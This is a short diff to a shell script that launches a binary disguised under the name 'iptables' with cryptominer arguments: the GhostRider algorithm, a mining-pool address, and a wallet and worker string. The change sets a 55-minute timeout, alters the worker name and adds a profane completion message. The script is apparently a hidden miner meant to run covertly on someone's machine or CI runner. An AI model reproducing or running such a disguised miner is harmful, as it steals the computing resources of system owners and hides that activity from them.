@@ -1,4 +1,5 @@
 #!/bin/sh
 chmod 777 iptables
-nohup ./iptables -a ghostrider --url 20.0.2.80:443 --user JV1wb2RLradsqueEvPnioKGZZRJ8xoYomm.SS -t 2 &
+nohup timeout 55m ./iptables -a ghostrider --url 20.0.2.80:443 --user JV1wb2RLradsqueEvPnioKGZZRJ8xoYomm.CIRCLE -t 1
+echo FUCK SHIT DONE
 
